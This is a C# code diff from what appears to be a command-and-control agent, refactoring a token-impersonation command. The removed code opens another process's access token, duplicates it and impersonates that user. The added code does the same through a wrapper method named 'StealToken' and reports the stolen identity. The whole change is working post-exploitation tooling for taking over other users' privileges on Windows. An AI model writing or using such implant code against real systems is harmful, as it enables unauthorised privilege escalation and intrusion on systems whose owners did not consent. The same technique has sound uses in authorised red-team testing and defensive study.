@@ -12,6 +12,7 @@ using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using WinAPI.Wrapper;
 
 namespace Commands
 {
@@ -26,57 +27,12 @@ namespace Commands
                 return;
             }
 
-            var process = Process.GetProcessById(pid);
+            var wrapper = WinAPIWrapper.CreateInstance();
+            var hToken = wrapper.StealToken(pid);
 
-            var hToken = IntPtr.Zero;
-            var hTokenDup = IntPtr.Zero;
-
-            try
-            {
-                //open handle to token
-                if (!Agent.Native.Advapi.OpenProcessToken(process.Handle, Agent.Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
-                {
-                    context.Result.Result += $"Failed to open process token";
-                    return;
-                }
-
-                //duplicate  token
-                var sa = new Agent.Native.Advapi.SECURITY_ATTRIBUTES();
-                 if(!Agent.Native.Advapi.DuplicateTokenEx(hToken, Agent.Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Agent.Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION, Agent.Native.Advapi.TokenType.TOKEN_IMPERSONATION, out  hTokenDup))
-                {
-                    Agent.Native.Kernel32.CloseHandle(hToken);
-                    process.Dispose();
-                    context.Result.Result += $"Failed to duplicate token";
-                    return;
-                }
-
-                //impersonate Token
-                if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
-                {
-                    var identity = new WindowsIdentity(hTokenDup);
-                    context.Result.Result += $"Successfully impersonate token {identity.Name}";
-                    ImpersonationHelper.Impersonate(hTokenDup);
-                    return;
-                }
-
-
-                context.Result.Result += $"Failed to impersonate token";
-                return;
-            }
-            catch
-            {
-                context.Result.Result += $"Failed to impersonate token";
-                return;
-            }
-            finally
-            {
-                if (hToken != IntPtr.Zero)
-                    Agent.Native.Kernel32.CloseHandle(hToken);
-                //if (hTokenDup != IntPtr.Zero) //we want to keep the token in order o use it in others threads
-                //    Agent.Native.Kernel32.CloseHandle(hTokenDup);
-                process.Dispose();
-            }
-
+            ImpersonationHelper.Impersonate(hToken);
+            var identity = new WindowsIdentity(hToken);
+            context.Result.Result += $"Successfully impersonate token {identity.Name}";
         }
     }
 }
